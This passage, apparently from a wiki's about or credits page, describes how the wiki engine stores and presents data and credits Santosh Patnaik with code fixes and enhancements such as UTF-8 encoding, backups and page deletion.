store data. The 'engine' is used to edit the data as well as to format
it and present it as a web page. Significant modifications were done
to the codes of this wiki for bugs and enhancements (XHTML compliance,
UTF-8 encoding, backup maintainance, page deletion, etc.) by Santosh
Patnaik (SP) who also largely seeded the wiki with new and old
(non-wiki) documents.
